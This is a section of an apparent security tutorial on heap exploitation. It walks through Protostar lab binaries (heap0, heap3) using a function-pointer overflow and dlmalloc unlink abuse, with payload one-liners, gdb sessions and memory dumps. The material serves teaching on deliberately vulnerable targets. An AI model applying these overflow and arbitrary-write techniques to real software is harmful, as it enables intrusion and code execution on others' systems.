\section{Heap}
There are two ways to allocate the memory necessary to store and manipulate data;
statically, and dynamically. In the previous section, we saw how one
specific sort of dynamic allocation - stack-based - could lead to
security vulnerabilities when proper precautions aren't taken. In this section,
we will shift focus to another sort of dynamically allocated memory, and how
certain mistakes with dealing with such memory can lead to exploitation
of the vulnerable program. There are some major differences between
dynamically and statically allocated memory. Obviously, dynamically
allocated memory can vary in size and location at runtime \emph{by default}.
So, even without any countermeasures to consider, we should expect
the location and size of various buffers and memory structures to change
based on the program's previous behaviour. As we focus on glibc 2.11.2,
we will note that its dynamic memory allocation/management algorithms - 
collectively known as ptmalloc/dlmalloc - are deterministic. We take
advantage of this in our simple programs to make demonstrations easier,
but in practice the complex nature of a vulnerable program would make
extra steps necessary. For example, a vulnerable http server might
require a certain number of carefully formatted requests in order
to massage the heap into a form necessary for (or conducive to) to exploitation.
This would further be complicated by any current users of the server,
which is entirely outside our control.

To simply demonstrate the concepts, we will be focusing on very simple
example programs, beginning with a very straightforward buffer overflow.
It should be noted that the details of ptmalloc/dlmalloc may change from
challenge to challenge. It seems that some are designed to be possible
without abusing the ptmalloc/dlmalloc algorithm itself, while others require
this more complicated approach. Thus, the ``easier" challenges will have
protections still in place, while the ``harder" challenges actually have
countermeasures removed, and other simplifications made. This can help
make learning easier, but you should remember this when you expand
on this knowledge by examining other scenarios.

%should we discuss the basics of dlmalloc/ptmalloc here? or just provide references?

%basic example
\subsection{Basics}
Consider the following program.

\lstinputlisting[language=C]{heap/heap0.c}

As is obvious, this program will allocate two structures on the heap,
point the function pointer to the \texttt{nowinner()} function,
politely tell us where both structures are located, take our
input as argument from the command line, then jump to our function pointer.
As should also be obvious by now, is that \texttt{strcpy()} does
not do bounds-checking on the input, and that this is very bad.

Running the program normally, we can see that we did not win.
We pass an argument to avoid a null pointer dereference.
\begin{lstlisting}
user@protostar:~/heap/heap0$ /opt/protostar/bin/heap0 asdf
data is at 0x804a008, fp is at 0x804a050
level has not been passed
\end{lstlisting}
Helpfully, we can see that there are \texttt{0x48} (72) bytes
from the beginning of our vulnerable buffer to the obvious target; \texttt{fp}.

However, this is the heap, so let's take a look at the memory to really get
an idea of what's happening. Remember that when displaying memory in 4-byte
chunks using the `x' command in gdb, it will do the conversion between
big and little-endian automatically.

\begin{lstlisting}
user@protostar:~/heap/heap0$ gdb -q /opt/protostar/bin/heap0
Reading symbols from /opt/protostar/bin/heap0...done.
(gdb) b *(main+81)
Breakpoint 1 at 0x80484dd: file heap0/heap0.c, line 36.
(gdb) r asdf
Starting program: /opt/protostar/bin/heap0 asdf
data is at 0x804a008, fp is at 0x804a050

Breakpoint 1, main (argc=2, argv=0xbffff864) at heap0/heap0.c:36
(gdb) x/24x 0x0804a000
0x804a000:      0x00000000      0x00000049      0x00000000      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048478      0x00000000      0x00000000      0x00020fa9
\end{lstlisting}

Here, we pause execution directly after the \texttt{printf} on line 34.
This way, we can easily examine the state of our allocated chunks
after they've been set up, noticing an important difference. As these
chunks are dynamically allocated, the dlmalloc/ptmalloc algorithms
require some metadata in order to manage these chunks efficiently.
To truly understand heap exploitation, you have to understand the algorithm
of the heap you are attacking. For this example, we don't necessarily
have to understand much, but this is a perfect opportunity to point out the
some of the important parts.

First, notice that we're told that our first heap structure, \texttt{d},
is located at \texttt{0x0804a008}. For all the programmer cares, this is
true. Their 64-character buffer does indeed start at \texttt{0x0804a008}.
However, within dlmalloc/ptmalloc, this chunck actually begins at 
\texttt{0x0804a000}. This is because of the \texttt{prev\_size} and
\texttt{size} fields at the beginning of each chunk which store
metadata required by dlmalloc/ptmalloc. As \texttt{prev\_size} is
not technically used on allocated chunks, these are zero.

Notice that the 4-byte int at \texttt{0x0804a004} is \texttt{0x49}.
Because of various reasons, the lowest 3
bits of \texttt{size} are used as status flags, so this actually
says that the current chunk's size is \texttt{0x48} (72) bytes, and
that the previous chunk is in use. Likewise, the function
pointer \texttt{fp} is located at the chunk beginning at
\texttt{0x0804a048}, which has a \texttt{size} of \texttt{0x11},
telling us this chunk is 16 bytes, and that the previous chunk is in use. \\

Turning away from heap internals and back towards the situation at hand,
this is a straightforward buffer overflow, much like the stack ones we've
already discussed. Since we want to change \texttt{fp} to point to
\texttt{winner} instead of \texttt{nowinner}, we can simply place that
address in the function pointer.

\begin{lstlisting}
user@protostar:~/heap/heap0$ objdump -t /opt/protostar/bin/heap0 | grep winner
08048464 g     F .text  00000014              winner
08048478 g     F .text  00000014              nowinner
user@protostar:~/heap/heap0$ cat do_heap0 && ./do_heap0
/opt/protostar/bin/heap0 `perl -e '$buf = "A"x72; print $buf."\x64\x84\x04\x08"'`
data is at 0x804a008, fp is at 0x804a050
level passed
\end{lstlisting}

Here, we've used a nifty bash trick by building our buffer with perl, then
printing it and using the result as our argument. As noted previously, there
were 72 bytes from the beginning of the vulnerable buffer to the beginning
of the target data, so we pad 72 bytes, then concatenate with the address
of the \texttt{winner} function in little endian. This overwrites \texttt{fp},
as is obvious from the \texttt{level passed} message.\\

So, what's the big difference between this and a stack-based buffer overflow?
Notice that in order to overflow to \texttt{fp}, we had to overwrite
both the \texttt{size} and \texttt{prev\_size} fields of the chunk
it belongs to. In this situation, there were no more heap manipulations
between when we attacked, at line 36, and when we got the result we
wanted, at line 38. However, it's possible that other operations, such
as a \texttt{free(f)} after our overwrite, could potentially corrupt the heap,
or crash the program. This presents an interesting situation; if overwriting
the user data the chunks store won't get us what we want, could overwriting
heap meatadata do so?


\subsection{Chunk Corruption}
While we are still able to overflow the programmer's variables and
buffers, the new avenue of attack is in the metadata used by the
dlmalloc/ptmalloc algorithm. Various pieces of information - size,
linked list pointers, bitflags - can be overwritten to allow for
dlmalloc/ptmalloc to do unexpected things, such as overwrite 
arbitrary portions of memory. However, this can be fairly 
complicated and involved. Please note that in this example, while
we are still essentially attacking a standard glibc implementation of dlmalloc,
the authors from \texttt{exploit-exercises.com}\footnote{http://www.exploit-exercises.com}
have somewhat simplified it.
This specific program is statically compiled with some slightly modified
glibc code, removing sanity and security checks which would otherwise
make exploitation very difficult. While this makes it easier to illustrate
the point, we lose relevance to modern heap corruption attacks, which are
even more complicated.

\lstinputlisting[language=C]{heap/heap3.c}

Initially, this program doesn't appear to be exploitable. Although
we do have buffer overflows from the 3 \texttt{strcpy()} calls on
lines 20, 21 and 22, none of the programmer's variables are really
important, and it's not even clear if we could overflow all the
way from the heap to the return pointer on the stack. However,
we can overflow the \texttt{size} and \texttt{prev\_size} fields
in two of these three malloc chunks. The trick is in overflowing
them with the right values. For example, consider the following
output from some exploratory overflowing:

\begin{lstlisting}
user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("A"*40)'` fdsa asdf
Segmentation fault
user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("B"*40)'` fdsa asdf
dynamite failed?
user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("C"*40)'` fdsa asdf
dynamite failed?
user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("D"*40)'` fdsa asdf
Segmentation fault
user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("E"*40)'` fdsa asdf
Segmentation fault
user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("F"*40)'` fdsa asdf
dynamite failed?
user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("G"*40)'` fdsa asdf
dynamite failed?
user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("H"*40)'` fdsa asdf
Segmentation fault
\end{lstlisting}

With buffers of 40 bytes, we're certainly overflowing chunk \texttt{b}'s
\texttt{size} field, leading to unexpected behavior within our call to free.
However, interestingly only certain values will cause us to crash with a segfault,
while other values seem to have no effect. This is specifically because of 
some indicator bits encoded within the size field, and how they affect execution
of dlmalloc's various subroutines. Because of this, and many other things, we will
want to have some familiarity with glibc's dlmalloc implementation.\\

Despite its age, the best overview of dlmalloc/ptmalloc is from Vudo Malloc Tricks\footnote{http://phrack.org/issues.html?issue=57\&id=8\&mode=txt}
by  Michel "MaXX" Kaempf. It goes over the entire collection of
algorithms in quite some depth, and as described by Phrack's authors 
upon its publication, ``... if you are serious about learning this
technique, there is no way around the article by MaXX". For an even
better reference, I recommend grabbing an old copy of the glibc source
code\footnote{http://ftp.gnu.org/gnu/libc/glibc-2.11.2.tar.gz}, and reading the ``malloc/malloc.c" file within it. Though
at some times dense and apparently difficult to understand, the comments
alone are worth having the file as a reference to the dlmalloc/ptmalloc
algorithm as it is implemented. The primary facts necessary for this paper
are that:
\begin{itemize}
\item Free memory is divided into ``chunks", and managed on a per-chunk basis.
\item Chunks which are no longer in use are kept in one of many circularly-linked lists.
\item Chunks are always contiguous in memory (no empty gaps).
\item A free chunk is never contiguous with other free chunks. In such a case, they will be coalesced into one chunk.
\item The beginning of each chunk contains metadata necessary for proper functioning of the algorithms.
\end{itemize}
Keeping these as handy references, it is
also recommended to be familiar with singly and doubly linked lists,
as well as structures in C.\\

%at this point, we should have just enough backgound in dlmalloc to follow the exploit.
%would be nice to talk about dlmalloc/ptmalloc more, but can't right now...

So, we're at least able to follow along as we exploit this program. Only
immediately relevant parts of dlmalloc/ptmalloc will be covered, so it's
recommended to do some research on your own for better comprehension. Recalling 
that we have the power to overflow chunks \texttt{b} and \texttt{c}, how
could we modify values to get what we want? For maximum satisfaction, at this 
point you should study glibc source code and phrack articles\footnote{http://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt}\footnote{http://www.phrack.org/issues.html?issue=66\&id=10\&mode=txt}\footnote{http://www.phrack.org/issues.html?issue=67\&id=8\&mode=txt} to independently
discover the solution. If you're willing to spoil your own fun, continue reading.\\

The most obvious and straightforward 
method (in this case) will be to make clever use of the unlink macro. Though
fairly complicated for a macro, we can isolate the important parts of it for study,
especially if we ignore the security checks which will not be present in this example.

\lstinputlisting[language=C]{heap/unlink_macro_excerpt}

This is a standard routine to unlink some node from a doubly-linked list.
To see how we could abuse this, let's step through it. First, the 
\texttt{FD} and \texttt{BK} variables are set to the chunks forward of and
back from chunk \texttt{P} in the circularly linked listed of currently
free chunks. This is expected, as these are the chunks whose pointers
will need to be modified to remove \texttt{P} from the list. In fact,
this is exactly what happens at lines \texttt{6} and \texttt{7}, when
either chunk's location is written in the other's appropriate pointer.
But wait a minute, each chunk here (\texttt{P}, \texttt{FD}, \texttt{BK})
is basically a \texttt{struct malloc\_chunk}. 
This structure's \texttt{fd} and \texttt{bk} \texttt{malloc\_chunk*}
fields are located (in our specific case) at \texttt{P+8} and 
\texttt{P+12} respectively, assuming we focus on chunk \texttt{P} as an example.
So, we can think of the two assignments on lines \texttt{6} and \texttt{7}
as:
\begin{lstlisting}
*(&FD+12) = &BK
*(&BK+8) = &FD
\end{lstlisting}
In fact, the corresponding machine code will look something like this:

\lstinputlisting[]{heap/unlink_macro_excerpt_assembly}

To be explicit, \texttt{-0x14(\%ebp)} is essentially \texttt{FD}, and
\texttt{-0x18(\%ebp)} is \texttt{BK}. The first two lines move them into
\texttt{\%eax} and \texttt{\%edx}, respectively, then on line 3,
\texttt{mov \%edx,0xc(\%eax)} performs \texttt{FD->bk = BK}. Likewise,
lines 4-6 together perform \texttt{BK->fd = FD}. The potential for
abuse comes in when the attacker somehow manages to control
the chunk \texttt{P}'s \texttt{fd} and \texttt{bk} fields, which 
gives the attacker control of the \texttt{FD} and \texttt{BK} variables,
which in turn will give the attacker control of where the values
of \texttt{FD} and \texttt{BK} are written later. This gives us
the potential to overwrite an almost arbitrary consecutive four bytes
in memory, under certain restrictions. For example, as the values written
to both addresses are also addresses themselves, both values we
write must also be addresses which are currently writeable in the process.
Though we will typically focus on only using one of the variables
for the target of our overwrite, we have to remember that two
writes will occur based on the values of \texttt{fd} and \texttt{bk}.\\

Now, this seems to be begging the question. If we could overwrite memory
to give \texttt{P->fd} and \texttt{P->bk} specific values, wouldn't
we already have the level of access we want? Well, remember, \texttt{P}
is just whatever chunk the dlmalloc group of algorithms decides should
be unlinked from a list of free chunks. Since our program is vulnerable
to a buffer overflow, we can not only overflow two separate chunks
\texttt{b} and \texttt{c} which may possibly be unlinked later, but we can also
overflow the locations of their \texttt{fd} and \texttt{bk} fields. The
only hurdle left would be getting one of these chunks operated
on by the \texttt{unlink} macro.\\

Going back to the dlmalloc algorithms (specifically, \texttt{free} and \texttt{malloc})
we see that there are certain circumstances that would cause a free chunk
to be unlinked, such as if it were reappropriated by \texttt{malloc} for
use, or if it were coalesced with an adjacent free chunk by \texttt{free}.
Within our example however, we don't seem to be able to encounter either
of these situations. Once we overflow our chunks, no more \texttt{malloc}
calls are made, and it's not clear that any of our chunks will be
automatically coalesced when they are freed. It would be nice if we could
force execution of the \texttt{unlink} macro instead of hoping one
occurs naturally. In fact, this is not only possible, but is an important
part of exploiting this program.\\

When a chunk is freed, the \texttt{free} algorithm will check if 
contiguous chunks are in use, in order to coalesce them to reduce 
heap fragmentation. In this situation, multiple free chunks are
combined into one larger free chunk, which necessitates a call
to \texttt{unlink} in order to remove chunk(s) which no longer exist.
We do have three calls to \texttt{free} after our overflows, so this
seems like it may be useful. The only question is how we could force
this to happen. Well, in order for adjacent chunks to be coalesced
with whatever chunk we're freeing, they must not be in use. As covered
earlier, this is determined by the least-significant bit in the chunk's
\texttt{size} field. Borrowing from comments in the glibc source:

\begin{lstlisting}
...
The size fields also hold bits representing whether chunks are free or
in use.
     chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
		         |             Size of previous chunk, if allocated            | |
		         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
		         |             Size of chunk, in bytes                       |M|P|
		   mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
						 |                                                               |
...
The P (PREV_INUSE) bit, stored in the unused low-order bit of the
chunk size (which is always a multiple of two words), is an in-use
bit for the *previous* chunk.  If that bit is *clear*, then the
word before the current chunk size contains the previous chunk
size, and can be used to find the front of the previous chunk.
...
\end{lstlisting}

It seems a bit confusing when precisely the \texttt{prev\_size} field will be used,
but the important part here is after the diagram: 
``If that bit is *clear*, then the word before the current chunk size contains the previous chunk
size, and can be used to find the front of the previous chunk." This is further illustrated
by the \texttt{prev\_inuse(p)} macro:

\begin{lstlisting}
/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */
#define PREV_INUSE 0x1

/* extract inuse bit of previous chunk */
#define prev_inuse(p)       ((p)->size & PREV_INUSE)
\end{lstlisting}

Now, to tie this all together into our technique to force an execution
of the \texttt{unlink} macro. Let's focus on the first chunk we overflow,
chunk \texttt{b}, with the goal of overwriting it such that, when it is
freed, it forces an \texttt{unlink} to be performed. To do this, we'll
need to trick \texttt{free} into thinking some adjacent chunk is
not in use. Consider what would happen if we overwrote \texttt{b}'s
header such that the \texttt{PREV\_INUSE} bit of \texttt{size}
were clear. In order to coalesce this previous (contiguously) chunk,
\texttt{free} would subtract \texttt{prev\_size} from \texttt{p},
the chunk being freed, in order to access the previous chunk's header.
However, not only can we not control chunk \texttt{a}'s header, but
chunk \texttt{b}'s \texttt{prev\_size} field was never properly
initialized, and is being overwritten anyways, so supplying a
value for \texttt{prev\_size} is a necessary opportunity. Let's
take advantage of it and carefully select a \texttt{prev\_size}
value to write in order to point \texttt{free} to a fake chunk of
our crafting.

\begin{lstlisting}
/* consolidate backward */
if (!prev_inuse(p)) {
	prevsize = p->prev_size;
	size += prevsize;
	p = chunk_at_offset(p, -((long) prevsize));
	unlink(p, bck, fwd);
}
\end{lstlisting}

We could choose many values. For example, a small but positive \texttt{prev\_size}
would put the fake chunk somewhere in chunk \texttt{a}'s data portion.
However, we cannot write null bytes with our overflow, so at the very least
some positive \texttt{prev\_size} would certainly be very large (it is a 4-byte integer).
Instead, we could take advantage of two's complement, give \texttt{prev\_size} a negative value, and place our
fake chunk within chunk \texttt{b}'s data portion. For example,
overwriting \texttt{prev\_size} with \texttt{0xfffffffc} (-4) would
place the fake chunk at \texttt{\&p + 0x4}, meaning that the fake chunk's
forward and back pointers will be at \texttt{\&p + 0x0c} and \texttt{\&p + 0x10}.\\

Assuming we wanted to overwrite the 4 bytes beginning at address \texttt{A} with
some value \texttt{B}, we'd have to do the following to properly set up our
buffer. First, we'll overwrite chunk \texttt{b}'s \texttt{prev\_size} field with
-4, overwrite \texttt{b}'s \texttt{size} field with some value whose low-order bit
is clear (-4 would work here as well), then, pad with 4 bytes of our choice. This
overwrites chunk \texttt{b}'s header, and gets us up to \texttt{\&b + 0xc}, where
we will put our fake chunk's \texttt{fd} pointer. Arbitrarily deciding to use this pointer
to indicate the target's position, we have some simple math to do. Since \texttt{A}
is the location we want to overwrite, and we're using the forward pointer
to do so, we'll need to compensate for the indexing that's done in \texttt{unlink}.
Essentially, we want \texttt{\&(FD->bk) == A}, which means we need \texttt{FD+0xc == A}.
Simple algebra then gives that \texttt{FD == A - 0xc}, so we'll want to take the
desired target, \texttt{A}, and place the bytes of \texttt{(long)(A - 0xc)} in our
buffer. Since the \texttt{unlink} macro will directly place \texttt{BK} here,
we'll then place the bytes of \texttt{(long)B} immediately after this, where our fake
chunk's \texttt{bk} field would be. Throughout this entire process, we
need to remember that our values of \texttt{A} and \texttt{B} are limited to
be within writeable pages of memory. Also, when constructing the buffer, we need
to conform to the architecture's endianness, which in this case is little-endian.\\

Alright, enough planning and theory, let's try this out. First, let's inspect
precisely how our chunks are laid out in memory. First, we place a breakpoint 
immediately after the calls to malloc so we can see where our chunks are allocated
(edited slightly for brevity):

\begin{lstlisting}
0x08048892 <main+9>:    movl   $0x20,(%esp)
0x08048899 <main+16>:   call   0x8048ff2 <malloc>
0x0804889e <main+21>:   mov    %eax,0x14(%esp)
0x080488a2 <main+25>:   movl   $0x20,(%esp)
0x080488a9 <main+32>:   call   0x8048ff2 <malloc>
0x080488ae <main+37>:   mov    %eax,0x18(%esp)
0x080488b2 <main+41>:   movl   $0x20,(%esp)
0x080488b9 <main+48>:   call   0x8048ff2 <malloc>
0x080488be <main+53>:   mov    %eax,0x1c(%esp)
(gdb) b *(main+21)
Breakpoint 2 at 0x804889e: file heap3/heap3.c, line 16.
(gdb) b *(main+37)
Breakpoint 3 at 0x80488ae: file heap3/heap3.c, line 17.
(gdb) b *(main+53)
Breakpoint 4 at 0x80488be: file heap3/heap3.c, line 18.
(gdb) r AAAA BBBB CCCC
Breakpoint 2, 0x0804889e in main (argc=4, argv=0xbffff854) at heap3/heap3.c:16
16      in heap3/heap3.c
(gdb) i r eax
eax            0x804c008        134529032
(gdb) c
Continuing.
Breakpoint 3, 0x080488ae in main (argc=4, argv=0xbffff854) at heap3/heap3.c:17
17      in heap3/heap3.c
(gdb) i r eax
eax            0x804c030        134529072
(gdb) c
Continuing.
Breakpoint 4, 0x080488be in main (argc=4, argv=0xbffff854) at heap3/heap3.c:18
18      in heap3/heap3.c
(gdb) i r eax
eax            0x804c058        134529112
\end{lstlisting}
So, our chunks are allocated consecutively at \texttt{0x804c008}, \texttt{0x804c030} and \texttt{0x804c058}.
Now, let's take a look at their state after they've been filled with simple input.
stopping on a breakpoint after the last call to strcpy, we have:

\begin{lstlisting}
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
\end{lstlisting}

Here, we automatically subtracted \texttt{0x8} from our first chunk's address so
we can see its header. As expected, at the 3 addresses returned from \texttt{malloc},
we have our data (the \texttt{0x41}, \texttt{0x42}, \texttt{0x43} bytes). Also
as expected, we have the \texttt{size} fields of our three chunks (the \texttt{0x00000029} integers)
all with their \texttt{PREV\_INUSE} bits set. The 8 bytes towards the end of our
memory dump belong to the ``top" chunk, which we won't concern ourselves with
for this example. Alright, let's try out the first portion of our exploit: forcing
execution of the \texttt{unlink} macro.

\begin{lstlisting}
(gdb) d b
Delete all breakpoints? (y or n) y
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` A B
Program received signal SIGSEGV, Segmentation fault.
0x080498fd in free (mem=0x804c030) at common/malloc.c:3638
(gdb) i r
eax            0x0      0
ecx            0x0      0
edx            0x0      0
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff710       0xbffff710
ebp            0xbffff758       0xbffff758
esi            0x0      0
edi            0x0      0
eip            0x80498fd        0x80498fd <free+217>
eflags         0x210202 [ IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) disas $eip
Dump of assembler code for function free:
0x08049824 <free+0>:    push   %ebp
0x08049825 <free+1>:    mov    %esp,%ebp
...
0x080498f4 <free+208>:  mov    %eax,-0x18(%ebp)
0x080498f7 <free+211>:  mov    -0x14(%ebp),%eax
0x080498fa <free+214>:  mov    -0x18(%ebp),%edx
0x080498fd <free+217>:  mov    %edx,0xc(%eax)
0x08049900 <free+220>:  mov    -0x18(%ebp),%eax
0x08049903 <free+223>:  mov    -0x14(%ebp),%edx
0x08049906 <free+226>:  mov    %edx,0x8(%eax)
...
\end{lstlisting}

Excellent! We broke something badly enough to cause a segfault! It doesn't take much
to see why either. Checking our registers, then disassembling where the instruction
pointer was at tells us we crashed in our \texttt{unlink} macro because \texttt{\%eax}
was null when we tried to perform \texttt{FD->bk = BK} (\texttt{mov \%edx,0xc(\%eax)}).
This is easy enough to see, since we overwrote chunk \texttt{b}'s \texttt{prev\_size}
and \texttt{size} fields with -4, which forces \texttt{unlink} to process a fake chunk
within chunk \texttt{b}. because we only filled \texttt{b} with the single byte representing
``A", the fake chunk's \texttt{fd} and \texttt{bk} pointers were obviously null, leading to the crash.

Now, let's load values into the \texttt{fd} and \texttt{bk} pointers of our fake chunk.
As covered previously, we expect these to be at \texttt{\&b + 0xc} and \texttt{\&b + 0x10}.

\begin{lstlisting}
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"A"*4+"B"*4)'` C
Program received signal SIGSEGV, Segmentation fault.
0x080498fd in free (mem=0x804c030) at common/malloc.c:3638
(gdb) i r eip
eip            0x80498fd        0x80498fd <free+217>
(gdb) i r eax
eax            0x41414141       1094795585
(gdb) i r edx
edx            0x42424242       1111638594
\end{lstlisting}

So, we've crashed in exactly the same location, but now we've pinned down the exact
locations that \texttt{FD} and \texttt{BK} are loaded from. For clarity, we'll run
the program again, but examine how all our chunks are set up immediately after the
calls to \texttt{strcpy}.

\begin{lstlisting}
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c020:      0x41414141      0x41414141      0xfffffffc      0xfffffffc
0x804c030:      0xf0f0f0f0      0x41414141      0x42424242      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000043      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
\end{lstlisting}

As we can see (especially when comparing with the previous dump of such memory from
a ``clean" execution), we've corrupted \texttt{b}'s header, and placed a fake chunk
at \texttt{\&b+0x4}. Now, let's try doing something with \texttt{unlink} besides segfaulting
our program. For example, let's try changing a few bytes within \texttt{a}'s data portion.

\begin{lstlisting}
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"*4)'` C
dynamite failed?

Program exited with code 021.
\end{lstlisting}

No segfault! Now we'll breakpoint after each of our 3 calls to \texttt{free}
to see how things change.

\begin{lstlisting}
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c020:      0x41414141      0x41414141      0xfffffffc      0xfffffffc
0x804c030:      0xf0f0f0f0      0x0804c004      0x0804c004      0x0804c004
0x804c040:      0x0804c004      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
(gdb) c
Continuing.

Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
26      in heap3/heap3.c
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x0804c004
0x804c010:      0x0804c004      0x41414141      0x41414141      0x41414141
0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x0804c004
0x804c040:      0x0804c004      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
(gdb) c
Continuing.

Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
28      in heap3/heap3.c
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x00000000      0x0804c004
0x804c010:      0x0804c004      0x41414141      0x41414141      0x41414141
0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x0804c004
0x804c040:      0x0804c004      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
\end{lstlisting}

Since the chunks are freed in reverse order, we expect the first free to
behave normally, the second free to trigger the arbitrary memory write,
and the third free to behave normally.
Here, we gave \texttt{FD} and \texttt{BK} both values of \texttt{0x0804c004},
so we expect this value to be written to both \texttt{0x0804c004 + 0x8} and \texttt{0x0804c004+0xc}.
As expected, we can see that both \texttt{0x0804c00c} and \texttt{0x0804c010} have
been changed from \texttt{0x41414141} to \texttt{0x0804c004} during our second
call to \texttt{free} (the second memory dump). We can also notice some other
side-affects from abusing dlmalloc like this. During the second call to \texttt{free},
our fake chunk's been processed further, and appears to contain calculated
\texttt{size}, \texttt{fd} and \texttt{bk} fields. Since this doesn't seem to negatively
affect exploitation, I've ignored it and not bothered to find out precisely
where it comes from, though it wouldn't be hard to discover.
We can also control where our two values are written with more precision. Let's compare
exploiting with the previous buffer, and with one where \texttt{FD} and \texttt{BK}
are given different values. Again, we've edited for brevity and clarity.

\begin{lstlisting}
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"*4)'` C
Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
26      in heap3/heap3.c
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x0804c004
0x804c010:      0x0804c004      0x41414141      0x41414141      0x41414141
0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x0804c004
0x804c040:      0x0804c004      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"+"\x0c\xc0\x04\x08")'` C
Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
26      in heap3/heap3.c
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x0804c00c      0x0804c004      0x41414141      0x41414141
0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"+"\x10\xc0\x04\x08")'` C
Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
26      in heap3/heap3.c
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x0804c010      0x41414141      0x0804c004      0x41414141
0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x00000000
